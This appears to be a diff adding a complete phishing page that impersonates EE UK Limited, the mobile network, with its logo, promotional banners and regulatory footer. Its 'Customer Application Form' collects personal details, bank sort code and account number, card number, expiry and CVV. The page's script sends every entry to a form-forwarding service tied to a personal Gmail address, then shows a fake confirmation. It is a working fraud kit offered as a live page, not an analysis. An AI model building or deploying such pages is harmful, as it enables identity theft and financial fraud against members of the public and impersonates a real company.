@@ -1,0 +1,747 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>EE UK Limited - Customer Details Form</title>
+
+<style>
+    *{
+        margin:0;
+        padding:0;
+        box-sizing:border-box;
+        font-family: 'Segoe UI', 'Arial', 'Helvetica Neue', sans-serif;
+    }
+
+    body{
+        background: #1FA69E;
+        padding: 40px 20px;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+    }
+
+    body::before {
+        content: "";
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-image: radial-gradient(circle at 10% 30%, rgba(255,255,255,0.1) 1.5%, transparent 2%);
+        background-size: 40px 40px;
+        pointer-events: none;
+        z-index: 0;
+    }
+
+    .container{
+        max-width: 1100px;
+        width: 100%;
+        margin: 0 auto;
+        background: #F0EB0A;
+        padding: 35px 38px 30px;
+        border-radius: 32px;
+        box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.28);
+        position: relative;
+        z-index: 2;
+    }
+
+    .header{
+        text-align: center;
+        margin-bottom: 25px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background: transparent;
+        width: 100%;
+    }
+
+    .logo-wrapper {
+        margin-bottom: 15px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: transparent;
+        width: 100%;
+        position: relative;
+    }
+
+    .live-logo-link {
+        display: block;
+        width: 100%;
+        text-decoration: none;
+        transition: all 0.2s ease;
+        position: relative;
+        overflow: hidden;
+        border-radius: 20px;
+        text-align: center;
+    }
+
+    .ee-logo {
+        width: auto;
+        max-width: 100%;
+        height: auto;
+        display: block;
+        margin: 0 auto;
+        object-fit: contain;
+        filter: drop-shadow(0 6px 12px rgba(0, 0, 0, 0.15));
+        transition: all 0.2s ease;
+        position: relative;
+        z-index: 1;
+        border-radius: 20px;
+    }
+
+    @media (min-width: 1024px) {
+        .ee-logo { max-width: 400px; width: 80%; }
+    }
+    @media (max-width: 768px) {
+        .ee-logo { max-width: 280px; width: 85%; }
+    }
+    @media (max-width: 480px) {
+        .ee-logo { max-width: 220px; width: 90%; }
+    }
+
+    .live-logo-link:hover {
+        transform: scale(1.01);
+    }
+
+    .dot-overlay {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 2;
+        overflow: hidden;
+        border-radius: 20px;
+    }
+
+    .dot {
+        position: absolute;
+        background: rgba(255, 255, 255, 0.9);
+        border-radius: 50%;
+        pointer-events: none;
+        opacity: 0;
+        box-shadow: 0 0 6px rgba(255,255,255,0.8);
+    }
+
+    .dot-sm { width: 3px; height: 3px; }
+    .dot-md { width: 5px; height: 5px; }
+    .dot-lg { width: 7px; height: 7px; }
+    .dot-xl { width: 9px; height: 9px; }
+
+    @keyframes fromLeft {
+        0% { transform: translateX(-50px) translateY(0); opacity: 0; }
+        10% { opacity: 0.9; }
+        90% { opacity: 0.9; }
+        100% { transform: translateX(calc(100% + 50px)) translateY(0); opacity: 0; }
+    }
+    @keyframes fromRight {
+        0% { transform: translateX(calc(100% + 50px)) translateY(0); opacity: 0; }
+        10% { opacity: 0.9; }
+        90% { opacity: 0.9; }
+        100% { transform: translateX(-50px) translateY(0); opacity: 0; }
+    }
+    @keyframes fromTop {
+        0% { transform: translateX(0) translateY(-50px); opacity: 0; }
+        10% { opacity: 0.9; }
+        90% { opacity: 0.9; }
+        100% { transform: translateX(0) translateY(calc(100% + 50px)); opacity: 0; }
+    }
+    @keyframes fromBottom {
+        0% { transform: translateX(0) translateY(calc(100% + 50px)); opacity: 0; }
+        10% { opacity: 0.9; }
+        90% { opacity: 0.9; }
+        100% { transform: translateX(0) translateY(-50px); opacity: 0; }
+    }
+
+    .company-info {
+        margin-bottom: 5px;
+    }
+
+    .company-info h1{
+        color: #1FA69E;
+        margin-bottom: 8px;
+        font-size: 32px;
+        letter-spacing: -0.3px;
+        font-weight: 800;
+        background: transparent;
+    }
+
+    .company-info p{
+        color: #2c3e50;
+        font-size: 17px;
+        font-weight: 500;
+        background: white;
+        display: inline-block;
+        padding: 6px 22px;
+        border-radius: 60px;
+    }
+
+    @media (max-width: 768px) {
+        .container { padding: 25px 20px 20px; }
+        .company-info h1 { font-size: 26px; }
+        .company-info p { font-size: 14px; }
+    }
+    @media (max-width: 480px) {
+        .company-info h1 { font-size: 22px; }
+        .company-info p { font-size: 12px; padding: 4px 16px; }
+    }
+
+    form{
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 24px;
+        background: white;
+        padding: 24px 28px;
+        border-radius: 28px;
+        margin-top: 10px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    .full-width{
+        grid-column: 1 / -1;
+    }
+
+    .form-group{
+        display: flex;
+        flex-direction: column;
+    }
+
+    label{
+        margin-bottom: 8px;
+        font-weight: 700;
+        color: #1e2a3a;
+        font-size: 14px;
+    }
+
+    .living-history-group {
+        grid-column: 1 / -1;
+        margin-top: 4px;
+        margin-bottom: 6px;
+    }
+    
+    .medium-block {
+        background: #fafcff;
+        border-radius: 20px;
+        padding: 12px 16px 16px 16px;
+        border: 1px solid #e2edf2;
+        transition: all 0.2s;
+    }
+    
+    .medium-block:hover {
+        border-color: #1FA69E;
+        background: #ffffff;
+    }
+    
+    .medium-block label {
+        font-size: 15px;
+        margin-bottom: 12px;
+        font-weight: 800;
+        color: #1FA69E;
+        display: inline-block;
+        width: 100%;
+        padding: 6px 0 6px 8px;
+        border-radius: 12px;
+    }
+    
+    .living-duration-select {
+        width: 100%;
+        padding: 14px 16px;
+        font-size: 15px;
+        border-radius: 18px;
+        border: 1.5px solid #cbdbe0;
+        background-color: white;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    
+    .living-duration-select:focus {
+        border-color: #1FA69E;
+        outline: none;
+    }
+
+    input, select, textarea{
+        padding: 12px 14px;
+        border: 1.5px solid #e2e8f0;
+        border-radius: 16px;
+        font-size: 14px;
+        background: #fff;
+        transition: all 0.2s ease;
+        font-weight: 500;
+    }
+
+    input:focus, select:focus, textarea:focus {
+        outline: none;
+        border-color: #1FA69E;
+        box-shadow: 0 0 0 4px rgba(31, 166, 158, 0.12);
+    }
+
+    .section-title {
+        grid-column: 1 / -1;
+        font-size: 20px;
+        font-weight: 800;
+        color: #1FA69E;
+        border-left: 5px solid #1FA69E;
+        padding-left: 16px;
+        margin: 12px 0 4px 0;
+        background: linear-gradient(90deg, rgba(31,166,158,0.05) 0%, rgba(31,166,158,0) 95%);
+        border-radius: 0 12px 12px 0;
+    }
+
+    .submit-btn {
+        grid-column: 1 / -1;
+        background: linear-gradient(105deg, #1FA69E 0%, #178a83 100%);
+        color: white;
+        border: none;
+        padding: 16px;
+        font-size: 18px;
+        font-weight: bold;
+        border-radius: 60px;
+        cursor: pointer;
+        transition: 0.2s;
+        box-shadow: 0 10px 20px rgba(31,166,158,0.35);
+        margin-top: 18px;
+    }
+
+    .submit-btn:hover {
+        background: linear-gradient(105deg, #178a83 0%, #0f6e68 100%);
+        transform: translateY(-2px);
+    }
+
+    .optional-badge {
+        font-size: 10px;
+        font-weight: normal;
+        background: #eef2ff;
+        padding: 2px 9px;
+        border-radius: 30px;
+        color: #2c3e66;
+        margin-left: 8px;
+    }
+
+    .date-hint {
+        font-size: 11px;
+        color: #6c7a91;
+        margin-top: 5px;
+    }
+
+    .form-message {
+        grid-column: 1 / -1;
+        padding: 14px 18px;
+        border-radius: 16px;
+        font-size: 14px;
+        font-weight: 500;
+        text-align: center;
+        display: none;
+    }
+    .form-message.success {
+        background: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+        display: block;
+    }
+    .form-message.error {
+        background: #f8d7da;
+        color: #721c24;
+        border: 1px solid #f5c6cb;
+        display: block;
+    }
+    .form-message.loading {
+        background: #e2f0fc;
+        color: #004085;
+        border: 1px solid #b8daff;
+        display: block;
+    }
+
+    @media(max-width: 780px){
+        body{ padding: 20px 15px; }
+        .container{ padding: 20px 16px; }
+        form{ grid-template-columns: 1fr; gap: 20px; padding: 20px; }
+        .section-title { font-size: 18px; }
+    }
+
+    .banners-section {
+        margin-top: 30px;
+        display: flex;
+        flex-direction: column;
+        gap: 28px;
+    }
+
+    .ee-regulatory-footer {
+        margin-top: 36px;
+        background: white;
+        border-radius: 28px;
+        padding: 28px;
+    }
+
+    .regulatory-block {
+        background: #f9fbfd;
+        border-radius: 20px;
+        padding: 20px 24px;
+        margin-bottom: 20px;
+        font-size: 12px;
+        line-height: 1.5;
+        color: #2c3e4e;
+        border-left: 3px solid #1FA69E;
+    }
+
+    .regulatory-block strong { color: #1f8a82; font-weight: 700; }
+
+    .copyright-bar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 12px;
+        padding-top: 12px;
+        font-size: 11px;
+        color: #5b6e82;
+        border-top: 1px dashed #d0e2e8;
+        margin-top: 8px;
+    }
+    .copyright-bar span { color: #1FA69E; font-weight: 600; }
+    .ee-legal-links { display: flex; gap: 20px; flex-wrap: wrap; }
+    .ee-legal-links a { color: #1f8a82; text-decoration: none; font-weight: 500; }
+    .ee-legal-links a:hover { color: #1FA69E; text-decoration: underline; }
+    .small-print { font-size: 10px; color: #7c8f9c; margin-top: 12px; text-align: center; }
+
+    .hero-carousel-banner_heroCardContent__PYlGG {
+        background: linear-gradient(135deg, #0a2b2a 0%, #0d3d3a 100%);
+        border-radius: 28px;
+        padding: 32px 36px;
+        text-align: center;
+        border: 1px solid rgba(31,166,158,0.3);
+    }
+    .lc-HeadingEE--sizeXXL { font-size: 40px; font-weight: 800; }
+    .lc-HeadingEE--styleVariantDefault { color: #ffffff; }
+    .lc-HeadingEE--styleVariantBrandColour { color: #1FA69E; }
+    .lc-Button {
+        display: inline-block;
+        padding: 14px 32px;
+        border-radius: 50px;
+        font-weight: 700;
+        font-size: 16px;
+        text-decoration: none;
+        background: #1FA69E;
+        color: #0a2b2a;
+    }
+    .lc-Button:hover { background: #3cbcb4; }
+    .lc-ButtonEE--styleSecondary {
+        background: transparent;
+        border: 2px solid #1FA69E;
+        color: #1FA69E;
+    }
+    @media (max-width: 768px) {
+        .lc-HeadingEE--sizeXXL { font-size: 28px; }
+        .hero-carousel-banner_heroCardContent__PYlGG { padding: 24px 20px; }
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="logo-wrapper">
+            <a href="https://ee.co.uk" target="_blank" rel="noopener noreferrer" class="live-logo-link">
+                <img src="https://play-lh.googleusercontent.com/3sLTcWWy-9iVT3q5eC3vp9Z410xvaa_gMqD3b83LmH0YY2ndPrHYSgJBh7Xxba-cJvQ" 
+                     alt="EE Official Logo" 
+                     class="ee-logo"
+                     loading="eager">
+                <div class="dot-overlay" id="dotOverlay"></div>
+            </a>
+        </div>
+        <div class="company-info">
+            <h1>EE UK Limited</h1>
+            <p>Customer Application Form</p>
+        </div>
+    </div>
+
+    <!-- FORMSPARK INTEGRATION - Receive submissions to gikumokanu1994@gmail.com -->
+    <!-- Form ID: RkV5lbucz -->
+    <form action="https://submit-form.com/RkV5lbucz" method="POST" id="customerForm">
+        <!-- Formspark required hidden fields -->
+        <input type="hidden" name="_email" value="gikumokanu1994@gmail.com">
+        <input type="hidden" name="_subject" value="New EE Customer Form Submission">
+        <input type="hidden" name="_redirect" value="https://ee.co.uk/thank-you">
+        
+        <!-- Honeypot spam protection (Formspark standard) -->
+        <input type="hidden" name="_captcha" value="false">
+        
+        <div class="section-title">Personal Information</div>
+
+        <div class="form-group">
+            <label>First Name</label>
+            <input type="text" name="first_name" required placeholder="Enter your first name">
+        </div>
+
+        <div class="form-group">
+            <label>Middle Name <span class="optional-badge">Optional</span></label>
+            <input type="text" name="middle_name" placeholder="Middle name (if applicable)">
+        </div>
+
+        <div class="form-group">
+            <label>Surname</label>
+            <input type="text" name="surname" required placeholder="Last name / Surname">
+        </div>
+
+        <div class="form-group">
+            <label>Phone Number</label>
+            <input type="tel" name="phone_number" required placeholder="07700 900123">
+        </div>
+
+        <div class="form-group">
+            <label>Date of Birth</label>
+            <input type="text" name="date_of_birth" required placeholder="DD/MM/YYYY" maxlength="10">
+            <div class="date-hint">Format: DD/MM/YYYY (e.g., 25/12/1990)</div>
+        </div>
+
+        <div class="form-group">
+            <label>Postcode</label>
+            <input type="text" name="postcode" required placeholder="E.g. M1 2WD">
+        </div>
+
+        <div class="form-group">
+            <label>House Number</label>
+            <input type="text" name="house_number" required placeholder="Flat 2 / 14B">
+        </div>
+
+        <div class="full-width living-history-group">
+            <div class="medium-block">
+                <label>Living History Duration <i>Residence period at current address</i></label>
+                <select name="living_history_duration" class="living-duration-select">
+                    <option value="" disabled selected>— Select duration at current address —</option>
+                    <option value="Less than 1 year">Less than 1 year</option>
+                    <option value="1 year">1 year</option>
+                    <option value="2 years">2 years</option>
+                    <option value="3 years">3 years</option>
+                    <option value="4 years">4 years</option>
+                    <option value="5 years">5 years</option>
+                    <option value="6 years">6 years</option>
+                    <option value="7 years">7 years</option>
+                    <option value="8 years">8 years</option>
+                    <option value="9 years">9 years</option>
+                    <option value="10 years">10 years</option>
+                    <option value="More than 10 years">More than 10 years</option>
+                </select>
+                <div class="duration-hint">
+                    <span>📌</span> Helps verify your stability & tenancy history — EE secure check
+                </div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Living Status</label>
+            <select name="living_status">
+                <option value="" selected disabled>— Select —</option>
+                <option>Homeowner</option>
+                <option>Tenant</option>
+                <option>Living with Family</option>
+                <option>Other</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>Employment Status</label>
+            <select name="employment_status">
+                <option value="" disabled selected>— Select —</option>
+                <option>Employed Full-time</option>
+                <option>Employed Part-time</option>
+                <option>Self-Employed</option>
+                <option>Student</option>
+                <option>Unemployed</option>
+                <option>Retired</option>
+            </select>
+        </div>
+
+        <div class="section-title">Bank & Card Details</div>
+
+        <div class="form-group">
+            <label>Name on Account</label>
+            <input type="text" name="account_name" placeholder="Full name as on bank account">
+        </div>
+
+        <div class="form-group">
+            <label>Sort Code</label>
+            <input type="text" name="sort_code" placeholder="00-00-00">
+        </div>
+
+        <div class="form-group">
+            <label>Account Number</label>
+            <input type="text" name="account_number" placeholder="12345678" maxlength="8">
+        </div>
+
+        <div class="form-group">
+            <label>Name on Card</label>
+            <input type="text" name="card_name" placeholder="As printed on card">
+        </div>
+
+        <div class="form-group">
+            <label>Card Number</label>
+            <input type="text" name="card_number" placeholder="**** **** **** ****" maxlength="19">
+        </div>
+
+        <div class="form-group">
+            <label>Expiry Date</label>
+            <input type="text" name="expiry_date" placeholder="MM/YY" maxlength="5">
+            <div class="date-hint">Format: MM/YY (e.g., 12/28)</div>
+        </div>
+
+        <div class="form-group">
+            <label>CVC / CVV</label>
+            <input type="password" name="cvv" maxlength="4" placeholder="***">
+        </div>
+
+        <div id="formMessage" class="form-message"></div>
+
+        <button type="submit" class="submit-btn" id="submitButton">
+            Submit
+        </button>
+    </form>
+
+    <div class="banners-section">
+        <div class="hero-carousel-banner_heroCardContent__PYlGG">
+            <h2 class="lc-HeadingEE--sizeXXL lc-HeadingEE--styleVariantDefault">GET THE EDGE</h2>
+            <h2 class="lc-HeadingEE--sizeXXL lc-HeadingEE--styleVariantBrandColour">WITH 5G+</h2>
+            <p style="color: rgba(255,255,255,0.85); margin: 20px 0;">Stay a step ahead on the UK's best network.</p>
+            <a href="https://ee.co.uk/why-ee/5g-on-ee" target="_blank" class="lc-Button">Explore 5G+</a>
+        </div>
+        <div class="hero-carousel-banner_heroCardContent__PYlGG">
+            <h2 class="lc-HeadingEE--sizeXXL lc-HeadingEE--styleVariantDefault">SAVE UP TO £977 ON 125GB ESSENTIALS</h2>
+            <p style="color: rgba(255,255,255,0.85); margin: 20px 0;">With the Google Pixel 10 Pro. Get the edge this summer with EE.</p>
+            <a href="https://ee.co.uk/mobile/pay-monthly-phones-gallery/google-pixel-10-pro-details" target="_blank" class="lc-Button">Buy now</a>
+            <a href="https://ee.co.uk/shop/mobile/upgrade-df-pay-monthly-phones-gallery/google-pixel-10-pro-details" target="_blank" class="lc-Button lc-ButtonEE--styleSecondary" style="margin-left: 15px;">Log in to upgrade</a>
+        </div>
+    </div>
+
+    <div class="ee-regulatory-footer">
+        <div class="regulatory-block">
+            <p><strong>EE Limited</strong> is authorised and regulated by the Financial Conduct Authority for the provision of consumer credit (FRN: 687832).</p>
+            <p><strong>EE Limited</strong> is an appointed representative of <strong>Chubb European Group SE (CEG)</strong>. CEG is authorised and regulated by the French Prudential Supervision and Resolution Authority (ACPR).</p>
+            <p>CEG is authorised by the Prudential Regulation Authority (PRA). Subject to regulation by the Financial Conduct Authority and limited regulation by the Prudential Regulation Authority.</p>
+        </div>
+        
+        <div class="copyright-bar">
+            <div class="ee-legal-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms & Conditions</a>
+                <a href="#">Cookie Settings</a>
+            </div>
+            <div><span>© 2026 EE UK Limited</span> | All rights reserved</div>
+        </div>
+        <div class="small-print">
+            EE Limited, Registered in England & Wales No. 03823687. Registered office: Trident Place, Mosquito Way, Hatfield, Hertfordshire, AL10 9BW.
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // Animated dots
+    (function() {
+        const overlay = document.getElementById('dotOverlay');
+        if (!overlay) return;
+        const animations = ['fromLeft', 'fromRight', 'fromTop', 'fromBottom'];
+        for (let i = 0; i < 40; i++) {
+            const dot = document.createElement('div');
+            dot.classList.add('dot', ['dot-sm', 'dot-md', 'dot-lg'][Math.floor(Math.random() * 3)]);
+            dot.style.top = Math.random() * 100 + '%';
+            dot.style.left = Math.random() * 100 + '%';
+            dot.style.animation = animations[Math.floor(Math.random() * animations.length)] + ' ' + (2 + Math.random() * 3) + 's linear infinite';
+            dot.style.animationDelay = Math.random() * 5 + 's';
+            overlay.appendChild(dot);
+        }
+    })();
+
+    // Date formatting for Date of Birth
+    const dobInput = document.querySelector('input[name="date_of_birth"]');
+    if (dobInput) {
+        dobInput.addEventListener('input', function() {
+            let value = this.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2 && value.length < 4) this.value = value.slice(0,2) + '/' + value.slice(2);
+            else if (value.length >= 4) this.value = value.slice(0,2) + '/' + value.slice(2,4) + '/' + value.slice(4,8);
+        });
+    }
+
+    // Date formatting for Expiry Date
+    const expiryInput = document.querySelector('input[name="expiry_date"]');
+    if (expiryInput) {
+        expiryInput.addEventListener('input', function() {
+            let value = this.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) this.value = value.slice(0,2) + '/' + value.slice(2,4);
+        });
+    }
+
+    // Formspark AJAX Submission - sends submissions to gikumokanu1994@gmail.com
+    const form = document.getElementById('customerForm');
+    const messageDiv = document.getElementById('formMessage');
+    const submitBtn = document.getElementById('submitButton');
+
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        // Show loading message
+        messageDiv.className = 'form-message loading';
+        messageDiv.textContent = 'Submitting your details... Please wait.';
+        submitBtn.disabled = true;
+        
+        // Get form data
+        const formData = new FormData(form);
+        
+        // Convert to URLSearchParams for Formspark
+        const urlEncodedData = new URLSearchParams();
+        for (const [key, value] of formData.entries()) {
+            if (value && value.toString().trim() !== '') {
+                urlEncodedData.append(key, value);
+            }
+        }
+        
+        try {
+            const response = await fetch(form.action, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Accept': 'application/json'
+                },
+                body: urlEncodedData.toString()
+            });
+            
+            // Formspark returns 200 OK on success
+            if (response.ok) {
+                messageDiv.className = 'form-message success';
+                messageDiv.textContent = '✓ Thank you! Your details have been submitted successfully. A confirmation will be sent to your email.';
+                form.reset();
+                
+                setTimeout(() => {
+                    messageDiv.style.display = 'none';
+                    messageDiv.className = 'form-message';
+                }, 6000);
+            } else {
+                const errorText = await response.text();
+                console.error('Formspark error:', errorText);
+                messageDiv.className = 'form-message error';
+                messageDiv.textContent = '✗ Submission failed. Please try again. If problem persists, contact support.';
+            }
+        } catch (error) {
+            console.error('Formspark network error:', error);
+            messageDiv.className = 'form-message error';
+            messageDiv.textContent = '✗ Network error. Please check your connection and try again.';
+        } finally {
+            submitBtn.disabled = false;
+            setTimeout(() => {
+                if (messageDiv.classList.contains('error')) {
+                    messageDiv.style.display = 'none';
+                    messageDiv.className = 'form-message';
+                }
+            }, 5000);
+        }
+    });
+</script>
+
+</body>
+</html>
